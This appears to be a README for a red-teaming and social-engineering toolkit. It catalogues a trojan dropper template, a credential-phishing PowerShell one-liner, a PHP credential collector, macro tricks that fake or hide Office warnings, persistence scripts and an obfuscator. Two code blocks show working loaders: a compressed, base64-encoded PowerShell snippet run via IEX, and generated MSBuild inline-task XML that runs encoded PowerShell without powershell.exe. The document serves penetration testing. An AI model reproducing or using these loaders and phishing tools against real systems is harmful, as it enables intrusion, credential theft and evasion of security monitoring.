## Red Teaming and Social-Engineering related scripts, tools and CheatSheets



- **`backdoor-drop.js`** - Internet Explorer - JavaScript trojan/backdoor dropper template, to be used during Penetration Testing assessments. ([gist](https://gist.github.com/mgeeky/b0aed7c1e510560db50f96604b150dac))

- **`clickOnceSharpPickTemplate.cs`** - This is a template for **C# Console Project** containing [SharpPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) technique of loading Powershell code from within C# application. The ClickOnce concept is to generate a windows self-updating Application that is specially privileged ([ClickOnce](https://www.slideshare.net/NetSPI/all-you-need-is-one-a-click-once-love-story-secure360-2015))

- **`compressedPowershell.py`** - Creates a Powershell snippet containing GZIP-Compressed payload that will get decompressed and executed (IEX)
. ([gist](https://gist.github.com/mgeeky/e30ceecc2082a11b99c7b24b42bd77fc))

    Example:

```
$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

- **`delete-warning-div-macro.vbs`** - VBA Macro function to be used as a Social Engineering trick removing "Enable Content" warning message as the topmost floating text box with given name. ([gist](https://gist.github.com/mgeeky/9cb6acdec31c8a70cc037c84c77a359c))

- **`generateMSBuildPowershellXML.py`** - Powershell via MSBuild inline-task XML payload generation script - To be used during Red-Team assignments to launch Powershell payloads without using `powershell.exe` ([gist](https://gist.github.com/mgeeky/df9f313cfe468e56c59268b958319bcb))

    Example output **not minimized**:
    
```
C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1

        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without     using 'powershell.exe'
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

[?] File not recognized as PE/EXE.

------------------------------------------------------------------------------------
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                              -->
  <!--  Automatically generated using `generateMSBuildPowershellXML.py` utility  -->
  <!--  by Mariusz B. / mgeeky <mb@binary-offensive.com>                         -->

  <Target Name="btLDoraXcZV">
    <hwiJYmWvD />
  </Target>
  <UsingTask TaskName="hwiJYmWvD" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v    4.0.dll" >
    <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class hwiJYmWvD : Task {
                public override bool Execute() {

                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZ    WN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygn    SDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW0    1U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZV    czNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0T    Xo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3    LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5    HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb    2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }
            }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
------------------------------------------------------------------------------------
```
    
**minimized**
    
```
C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1 -m                     
                                                                                                                  
        :: Powershell via MSBuild inline-task XML payload generation     script                                       
        To be used during Red-Team assignments to launch Powershell payloads without     using 'powershell.exe'       
        Mariusz B. / mgeeky, <mb@binary-offensive.com>                                                                
                                                                                                                  
[?] File not recognized as PE/EXE.                                                                                    
                                                                                                                  
------------------------------------------------------------------------------------                                  
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target     Name="mYOYInAFWE"><DpaYaokgauWBJbe />
</Target><UsingTask TaskName="DpaYaokgauWBJbe" TaskFactory="CodeTaskFactory"     AssemblyFile="C:\Windows\Microsoft.Ne
t\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Reference     Include="System.Management.Automation" /><
Code Type="Class" Language="cs"><![CDATA[using System.Management.Automation;using     System.Management.Automation.Run
spaces;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class     DpaYaokgauWBJbe:Task{public ov
erride bool Execute(){byte[]    x=System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb25
2ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFMQkxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbW    ZwNmVZM0Z4YW01U1RtV3NsWlZQZ
m1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05T    OVhORFpGZXI2cHhjV0o2YWxPK1J
WQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy    5TdHJlYW1SZWFkZXIoTmV3LU9ia
mVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2Rl    XTo6RGVjb21wcmVzcykpKS5SZWF
kVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace     r=RunspaceFactory.CreateRunspace();r.Open
();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return     true;}}]]></Code></Task></Usi
ngTask></Project>                                                                                                     
------------------------------------------------------------------------------------                              
```

- **`Invoke-Command-Cred-Example.ps1`** - Example of using PSRemoting with credentials passed directly from command line. ([gist](https://gist.github.com/mgeeky/de4ecf952ddce774d241b85cfbf97faf))

- **`MacroDetectSandbox.vbs`** - Visual Basic script responsible for detecting Sandbox environments, as presented in modern Trojan Droppers implemented in Macros. ([gist](https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d))

- **`Macro-Less-Cheatsheet.md`** - Macro-Less Code Execution in MS Office via DDE (Dynamic Data Exchange) techniques Cheat-Sheet ([gist](https://gist.github.com/mgeeky/981213b4c73093706fc2446deaa5f0c5))

- **`macro-psh-stdin-author.vbs`** - VBS Social Engineering Macro with Powershell invocation taking arguments from Author property and feeding them to StdIn. ([gist](https://gist.github.com/mgeeky/50c4b7fa22d930a80247fea62755fbd3))

- **`msbuild-powershell-msgbox.xml`** - Example of Powershell execution via MSBuild inline task XML file. On a simple Message-Box script.
 ([gist](https://gist.github.com/mgeeky/617c54a23f0c4e99e6f475e6af070810))

- **`muti-stage-1.md`** - Multi-Stage Penetration-Testing / Red Teaming Malicious Word document creation process. ([gist](https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb))

- **`Phish-Creds.ps1`** - Powershell oneline Credentials Phisher - to be used in malicious Word Macros/VBA/HTA or other RCE commands on seized machine. ([gist](https://gist.github.com/mgeeky/a404d7f23c85954650d686bb3f02abaf))

    One can additionally add, right after `Get-Credential` following parameters that could improve pretext's quality during social engineering attempt:
    - `-Credential domain\username` - when we know our victim's domain and/or username - we can supply this info to the dialog
    - `-Message "Some luring sentence"` - to include some luring message

- [**`PhishingPost`**](https://github.com/mgeeky/PhishingPost) - (PHP Script intdended to be used during Phishing campaigns as a credentials collector linked to backdoored HTML <form> action parameter.

- [**`RobustPentestMacro`**](https://github.com/mgeeky/RobustPentestMacro) - This is a rich-featured Visual Basic macro code for use during Penetration Testing assignments, implementing various advanced post-exploitation techniques.

- **`set-handler.rc`** - Quickly set metasploit's multi-handler + web_delivery (separated) handler for use with powershell. ([gist](https://gist.github.com/mgeeky/bf4d732aa6e602ca9b77d089fd3ea7c9))

- **`SubstitutePageMacro.vbs`** - This is a template for the Malicious Macros that would like to substitute primary contents of the document (like luring/fake warnings to "Enable Content") and replace document's contents with what is inside of an AutoText named `RealDoc` (configured via variable `autoTextTemplateName` ). ([gist](https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6))

- **`warnings\EN-Word.docx`** and **`warnings\EN-Excel.docx`**  - Set of ready-to-use Microsoft Office Word shapes that can be pasted / inserted into malicious documents for enticing user into clicking "Enable Editing" and "Enable Content" buttons.

- **`WMIPersistence.vbs`** - Visual Basic Script implementing WMI Persistence method (as implemented in SEADADDY malware and further documented by Matt Graeber) to make the Macro code schedule malware startup after roughly 3 minutes since system gets up. ([gist](https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a))

- **`Various-Macro-Based-RCEs.md`** - Various Visual Basic Macros-based Remote Code Execution techniques to get your meterpreter invoked on the infected machine. ([gist](https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d))

- **`vba-macro-mac-persistence.vbs`** - (WIP) Working on VBA-based MacPersistance functionality for MS Office for Mac Macros. ([gist](https://gist.github.com/mgeeky/dd184e7f50dfab5ac97b4855f23952bc))

- **`vba-windows-persistence.vbs`** - VBA Script implementing two windows persistence methods - via WMI EventFilter object and via simple Registry Run. ([gist](https://gist.github.com/mgeeky/07ffbd9dbb64c80afe05fb45a0f66f81))

- [**`VisualBasicObfuscator`**](https://github.com/mgeeky/VisualBasicObfuscator) - Visual Basic Code universal Obfuscator intended to be used during penetration testing assignments.
